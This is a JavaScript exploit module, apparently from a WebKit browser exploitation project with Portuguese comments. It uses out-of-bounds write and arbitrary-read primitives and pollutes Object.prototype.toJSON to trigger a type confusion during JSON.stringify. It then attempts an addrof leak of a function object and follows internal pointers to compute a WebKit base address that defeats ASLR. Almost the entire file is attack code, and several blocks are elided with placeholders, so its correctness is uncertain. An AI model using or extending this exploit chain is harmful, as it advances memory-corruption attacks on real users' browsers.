// js/script3/testArrayBufferVictimCrash.mjs (R43L - Addrof em target.toJSON)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read,
    oob_write_absolute,
    isOOBReady,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R43_AddrofInTargetToJSON";

const VICTIM_TA_SIZE_ELEMENTS = 8; // Para o TypedArray que vai no JSON.stringify (pode ser pequeno)
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE = 0x7C;
const OOB_WRITE_VALUE_FOR_TC = 0xABABABAB;
const PROBE_CALL_LIMIT_V82 = 10;

const FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET);
const ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL = 0x8;
const EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL);

let targetFunctionForLeak_InToJSON; // Função alvo para addrof
let leaked_target_function_addr = null; // Variável global para armazenar o endereço vazado

// scratchpad buffer e views serão anexados à targetFunctionForLeak_InToJSON
const SCRATCHPAD_SIZE_BYTES = 8; // Suficiente para um ponteiro 64-bit

function isValidPointer(ptr, context = "") { /* ... (sem alteração, com logs) ... */
    if (!isAdvancedInt64Object(ptr)) { logS3(`[isValidPointer-${context}] Input não é AdvInt64: ${String(ptr)}`, "debug_detail"); return false; }
    const high = ptr.high(); const low = ptr.low();
    if (high === 0 && low === 0) { logS3(`[isValidPointer-${context}] NULO: ${ptr.toString(true)}`, "debug_detail"); return false; }
    if (high === 0x7FF80000 && low === 0x0) { logS3(`[isValidPointer-${context}] NaN Específico: ${ptr.toString(true)}`, "debug_detail"); return false; }
    if ((high & 0x7FF00000) === 0x7FF00000 && ((high & 0x000FFFFF) !== 0 || low !== 0)) { logS3(`[isValidPointer-${context}] NaN Genérico: ${ptr.toString(true)}`, "debug_detail"); return false; }
    if (high === 0 && low < 0x10000) { logS3(`[isValidPointer-${context}] Ponteiro Baixo: ${ptr.toString(true)}`, "debug_detail"); return false; }
    return true;
}
function safeToHex(value, length = 8) { /* ... (sem alteração) ... */
    if (typeof value === 'number') { return '0x' + (value >>> 0).toString(16).padStart(length, '0'); }
    if (value === null || value === undefined) { return String(value); }
    return toHex(value);
}

export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Addrof em target.toJSON ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init AddrInToJSON...`;

    leaked_target_function_addr = null; // Resetar
    let addrof_details_from_toJSON = { // Para armazenar o resultado da tentativa de addrof
        attempted: false,
        success: false,
        leaked_address_str: null,
        notes: "",
        raw_low: null,
        raw_high: null
    };

    targetFunctionForLeak_InToJSON = function someUniqueLeakFunctionR43L_TargetToJSON() {
        return `target_R43L_TargetToJSON_${Date.now()}`;
    };
    // Anexar o scratchpad e views à própria função
    targetFunctionForLeak_InToJSON.scratchpad_buffer = new ArrayBuffer(SCRATCHPAD_SIZE_BYTES);
    targetFunctionForLeak_InToJSON.scratchpad_float_view = new Float64Array(targetFunctionForLeak_InToJSON.scratchpad_buffer);
    targetFunctionForLeak_InToJSON.scratchpad_uint32_view = new Uint32Array(targetFunctionForLeak_InToJSON.scratchpad_buffer);
    targetFunctionForLeak_InToJSON.scratchpad_uint32_view.fill(0); // Limpar o scratchpad

    targetFunctionForLeak_InToJSON.toJSON = function() {
        logS3("[TARGET_FUNCTION_toJSON] toJSON da targetFunctionForLeak_InToJSON FOI CHAMADO!", "vuln");
        addrof_details_from_toJSON.attempted = true;

        if (!this.scratchpad_buffer || !this.scratchpad_float_view || !this.scratchpad_uint32_view) {
            logS3("   [TARGET_FUNCTION_toJSON] ERRO: Scratchpad não encontrado em 'this'.", "critical");
            addrof_details_from_toJSON.notes = "Scratchpad não encontrado em 'this' (targetFunction).";
            return "toJSON_target_err_no_scratchpad";
        }
        
        // 'this' aqui é targetFunctionForLeak_InToJSON
        logS3("   [TARGET_FUNCTION_toJSON] Tentando addrof de 'this' (targetFunctionForLeak_InToJSON)...", "info_emphasis");
        const original_low = this.scratchpad_uint32_view[0];
        const original_high = this.scratchpad_uint32_view[1];

        try {
            this.scratchpad_float_view[0] = this; // Tentar vazar o endereço da própria função 'targetFunctionForLeak_InToJSON'
            
            const val_after_assign_type = typeof this.scratchpad_float_view[0];
            const val_after_assign_is_obj = this.scratchpad_float_view[0] === this;
            logS3(`   [TARGET_FUNCTION_toJSON] Após atribuição: scratchpad_float_view[0] type=${val_after_assign_type}, isObjRef=${val_after_assign_is_obj}`, "leak_detail");

            if (val_after_assign_type === 'number' && isNaN(this.scratchpad_float_view[0])) {
                addrof_details_from_toJSON.notes = "Atribuição ao scratchpad resultou em NaN.";
                logS3(`   [TARGET_FUNCTION_toJSON] AVISO: scratchpad_float_view[0] se tornou NaN.`, "warn");
            }

            const leaked_low = this.scratchpad_uint32_view[0];
            const leaked_high = this.scratchpad_uint32_view[1];
            addrof_details_from_toJSON.raw_low = leaked_low;
            addrof_details_from_toJSON.raw_high = leaked_high;

            const potential_addr = new AdvancedInt64(leaked_low, leaked_high);
            addrof_details_from_toJSON.leaked_address_str = potential_addr.toString(true);
            logS3(`   [TARGET_FUNCTION_toJSON] Raw Addrof: L=0x${leaked_low.toString(16)}, H=0x${leaked_high.toString(16)} -> ${potential_addr.toString(true)}`, "leak");

            if (isValidPointer(potential_addr, "_targetToJSONAddrof")) {
                leaked_target_function_addr = potential_addr; // Armazenar globalmente
                addrof_details_from_toJSON.success = true;
                addrof_details_from_toJSON.notes = "Addrof em target.toJSON BEM SUCEDIDO!";
                logS3(`   [TARGET_FUNCTION_toJSON] !!! ADDROF BEM SUCEDIDO: ${potential_addr.toString(true)} !!!`, "success_major");
            } else {
                addrof_details_from_toJSON.notes += " Endereço vazado não é ponteiro válido.";
                logS3(`   [TARGET_FUNCTION_toJSON] Endereço vazado (${potential_addr.toString(true)}) não é ponteiro válido.`, "warn");
            }
        } catch (e_addrof) {
            addrof_details_from_toJSON.notes += ` Exceção durante addrof: ${e_addrof.message}`;
            logS3(`   [TARGET_FUNCTION_toJSON] Exceção durante addrof: ${e_addrof.message}`, "error");
            console.error("[TARGET_FUNCTION_toJSON] Exceção addrof:", e_addrof);
        } finally {
            this.scratchpad_uint32_view[0] = original_low; // Restaurar scratchpad
            this.scratchpad_uint32_view[1] = original_high;
        }
        return "toJSON_de_targetFunctionForLeak_executado"; // O que JSON.stringify vai usar
    };
    logS3(`Função alvo e seu scratchpad/toJSON definidos.`, 'info');


    logS3(`--- Fase 0 (AddrofInToJSON): Sanity Checks ---`, "subtest", FNAME_CURRENT_TEST_BASE);
    let coreOOBReadWriteOK = false;
    try { coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3, safeToHex); }
    catch (e_sanity) { logS3(`Erro Sanity: ${e_sanity.message}`, "critical"); coreOOBReadWriteOK = false; }
    logS3(`Sanity Check: ${coreOOBReadWriteOK ? 'SUCESSO' : 'FALHA'}`, coreOOBReadWriteOK ? 'good' : 'critical');
    await PAUSE_S3(100);

    if (!coreOOBReadWriteOK) { return { errorOccurred: "OOB Sanity Check Failed", /*...*/ }; }

    let result_for_runner = {
        errorOccurred: null, tc_probe_details: null, stringifyResult: null,
        addrof_result: { success: false, msg: "Addrof (AddrofInToJSON): Não iniciado.", leaked_object_addr: null, leaked_object_addr_candidate_str: null },
        webkit_leak_result: { success: false, msg: "WebKit Leak (AddrofInToJSON): Não iniciado." },
        oob_params_used: { offset: safeToHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE), value: safeToHex(OOB_WRITE_VALUE_FOR_TC) },
        heisenbug_on_M2_confirmed_by_tc_probe: false,
        addrof_in_target_toJSON_details: null // Novo campo para resultados desta estratégia
    };
    
    let victim_ta_for_json_trigger = null;
    let m1_ref_for_sondar = null;
    let m2_object_for_sondar = null;

    let probe_call_count_iter = 0; // Corrigido: Declarar aqui
    let tc_detected_in_probe = false;
    // let heisenbugConfirmedThisIter = false; // Usar tc_detected_in_probe para simplificar

    function toJSON_TA_Probe_Iter_Closure_AddrofInToJSON() {
        probe_call_count_iter++; const call_num = probe_call_count_iter;
        const ctts = Object.prototype.toString.call(this);
        const is_m2c = (this === m2_object_for_sondar && m2_object_for_sondar !== null);

        try {
            if (call_num > PROBE_CALL_LIMIT_V82) return { r_stop: "limit" };

            if (call_num === 1 && this === victim_ta_for_json_trigger) {
                logS3(`[PROBE_AddrofInToJSON] Call #${call_num}: 'this' é victim_ta_for_json_trigger. Configurando M1/M2...`, "debug");
                m2_object_for_sondar = { 
                    id: "M2_TRIGGERS_TARGET_toJSON", 
                    prop_with_target_function: targetFunctionForLeak_InToJSON,
                };
                m1_ref_for_sondar = { marker_id_addrof_in_target_toJSON: "M1_AddrofInTargetToJSON", payload_M2_obj: m2_object_for_sondar };
                return m1_ref_for_sondar;

            } else if (is_m2c) {
                if (!tc_detected_in_probe) {
                    tc_detected_in_probe = true;
                    result_for_runner.tc_probe_details = { /* ... */ this_is_M2: true, notes: "TC Confirmada. 'this' é m2_object_for_sondar."};
                    logS3(`[PROBE_AddrofInToJSON] Call #${call_num} (M2C): FIRST TC. 'this' é m2_object_for_sondar (id: ${this.id}). Tipo: ${ctts}`, "vuln");
                }
                // Deixar JSON.stringify tentar serializar 'this' (m2_object_for_sondar)
                // o que deve chamar targetFunctionForLeak_InToJSON.toJSON()
                return this; 
            }
        } catch (e_pm) { /* ... */ }
        return { gen_m: call_num, type: ctts };
    }

    let iter_primary_error = null;
    let iter_raw_stringify_output = null;

    try {
        logS3(`  --- Fase 1 (AddrofInToJSON): Configuração e Trigger da TC ---`, "subtest", FNAME_CURRENT_TEST_BASE);
        victim_ta_for_json_trigger = new Uint32Array(VICTIM_TA_SIZE_ELEMENTS);
        logS3(`   victim_ta_for_json_trigger criado. Length: ${victim_ta_for_json_trigger.length}`, "info");

        await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_TEST_BASE}-OOBSetup` });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE, OOB_WRITE_VALUE_FOR_TC, 4);
        logS3(`   OOB Write: ${safeToHex(OOB_WRITE_VALUE_FOR_TC)} @ ${safeToHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE)}`, 'info');
        await PAUSE_S3(150);

        logS3(`  --- Tentativa de Detecção de TC e Addrof em target.toJSON ---`, "subtest", FNAME_CURRENT_TEST_BASE);
        const ppKey = 'toJSON'; let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey); let polluted = false;
        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_Iter_Closure_AddrofInToJSON, writable: true, configurable: true, enumerable: false });
            polluted = true;
            
            iter_raw_stringify_output = JSON.stringify(victim_ta_for_json_trigger); 
            result_for_runner.stringifyResult = iter_raw_stringify_output;
            logS3(`   JSON.stringify raw output: ${iter_raw_stringify_output}`, "leak_detail");

            result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe = tc_detected_in_probe; // Usar a variável corrigida
            if (tc_detected_in_probe) {
                logS3(`  TC Probe (AddrofInToJSON): TC CONFIRMADA.`, "vuln");
            } else {
                logS3(`  TC Probe (AddrofInToJSON): TC NÃO Confirmada.`, "warn");
            }
        } catch (e_str) {
            if (!iter_primary_error) iter_primary_error = e_str;
            logS3(`  TC Probe (AddrofInToJSON): JSON.stringify EXCEPTION: ${e_str.message}`, "error");
            result_for_runner.stringifyResult = { error_during_stringify: e_str.message };
        } finally {
            if (polluted) { if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc); else delete Object.prototype[ppKey]; }
        }
        
        result_for_runner.addrof_in_target_toJSON_details = addrof_details_from_toJSON; // Armazenar detalhes do addrof
        if (addrof_details_from_toJSON.success) {
             logS3(`  Addrof DENTRO de target.toJSON teve sucesso: ${addrof_details_from_toJSON.leaked_address_str}`, "success_major");
             result_for_runner.addrof_result.success = true;
             result_for_runner.addrof_result.msg = "Addrof bem-sucedido via target.toJSON()";
             result_for_runner.addrof_result.leaked_object_addr = addrof_details_from_toJSON.leaked_address_str;
             result_for_runner.addrof_result.leaked_object_addr_candidate_str = addrof_details_from_toJSON.leaked_address_str;
        } else {
             logS3(`  Addrof DENTRO de target.toJSON falhou. Notas: ${addrof_details_from_toJSON.notes}`, "warn");
             result_for_runner.addrof_result.msg = `Addrof via target.toJSON() falhou: ${addrof_details_from_toJSON.notes}`;
        }
        
        logS3(`  --- Fase de TC e Addrof em target.toJSON Concluída. TC: ${tc_detected_in_probe} ---`, "subtest", FNAME_CURRENT_TEST_BASE);
        await PAUSE_S3(100);

        // WebKitLeak
        if (result_for_runner.addrof_result.success && leaked_target_function_addr) {
            logS3(`  --- Fase 2 (AddrofInToJSON): Teste de WebKit Base Leak ---`, "subtest", FNAME_CURRENT_TEST_BASE);
            if (!isOOBReady(`${FNAME_CURRENT_TEST_BASE}-PreArbReadCheck`)) { /* ... */ await triggerOOB_primitive({ force_reinit: true, /*...*/ }); }
            if (!isOOBReady()) { /* ... */ result_for_runner.webkit_leak_result.msg = "Falha ao preparar OOB para arb_read."; }
            else {
                try {
                    logS3(`  WebKitLeak: Endereço da função alvo (leaked_target_function_addr): ${leaked_target_function_addr.toString(true)}`, 'info');
                    const ptr_exe = await arb_read(leaked_target_function_addr.add(FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE), 8);
                    result_for_runner.webkit_leak_result.internal_ptr_stage1 = isAdvancedInt64Object(ptr_exe) ? ptr_exe.toString(true) : String(ptr_exe);
                    if (!isValidPointer(ptr_exe, "_wkLeakExe")) throw new Error(`Ptr para ExecutableInstance inválido: ${result_for_runner.webkit_leak_result.internal_ptr_stage1}`);
                    logS3(`  WebKitLeak: Ptr to ExecutableInstance: ${ptr_exe.toString(true)}`, 'leak');

                    const ptr_jitvm = await arb_read(ptr_exe.add(EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM), 8);
                    result_for_runner.webkit_leak_result.internal_ptr_stage2 = isAdvancedInt64Object(ptr_jitvm) ? ptr_jitvm.toString(true) : String(ptr_jitvm);
                    if (!isValidPointer(ptr_jitvm, "_wkLeakJitVm")) throw new Error(`Ptr para JIT/VM inválido: ${result_for_runner.webkit_leak_result.internal_ptr_stage2}`);
                    logS3(`  WebKitLeak: Ptr to JIT/VM: ${ptr_jitvm.toString(true)}`, 'leak');
                    
                    const page_mask = new AdvancedInt64(0x0, ~0xFFF);
                    const base_candidate = ptr_jitvm.and(page_mask);
                    result_for_runner.webkit_leak_result.webkit_base_candidate = base_candidate.toString(true);
                    result_for_runner.webkit_leak_result.success = true;
                    result_for_runner.webkit_leak_result.msg = `WebKitLeak: Candidato a base: ${base_candidate.toString(true)}`;
                    logS3(`  WebKitLeak: SUCESSO! ${result_for_runner.webkit_leak_result.msg}`, "vuln");
                } catch (e_wk) {
                    result_for_runner.webkit_leak_result.msg = `WebKitLeak EXCEPTION: ${e_wk.message || String(e_wk)}`;
                    logS3(`  WebKitLeak: ERRO - ${result_for_runner.webkit_leak_result.msg}`, "error");
                }
            }
        } else {
            logS3(`   WebKitLeak pulado: addrof falhou ou endereço não disponível.`, "warn");
        }

    } catch (e_outer_iter) { /* ... */ result_for_runner.errorOccurred = e_outer_iter.message || String(e_outer_iter); }
    finally { await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_TEST_BASE}-FinalClear` }); }

    result_for_runner.total_probe_calls_last_iter = probe_call_count_iter; // Corrigido
    result_for_runner.iteration_results_summary = [{ /* ... sumário simples ... */ }];
    result_for_runner.oob_value_of_best_result = safeToHex(OOB_WRITE_VALUE_FOR_TC);
    result_for_runner.heisenbug_on_M2_in_best_result = result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe;


    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Final result (AddrofInToJSON): ${JSON.stringify(result_for_runner, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);

    let final_title_status = "No Notable Result";
    if (result_for_runner.webkit_leak_result.success) {
        final_title_status = "WebKitLeak SUCCESS!";
    } else if (result_for_runner.addrof_result.success) {
        final_title_status = "Addrof SUCCESS, WebKitLeak Fail/Skipped";
    } else if (result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe) {
        final_title_status = "TC Confirmed, Addrof Fail";
    } else if (result_for_runner.errorOccurred) {
        final_title_status = `Error - ${result_for_runner.errorOccurred}`;
    }
    document.title = `${FNAME_CURRENT_TEST_BASE}_R43L_Final: ${final_title_status}`;

    return result_for_runner;
}
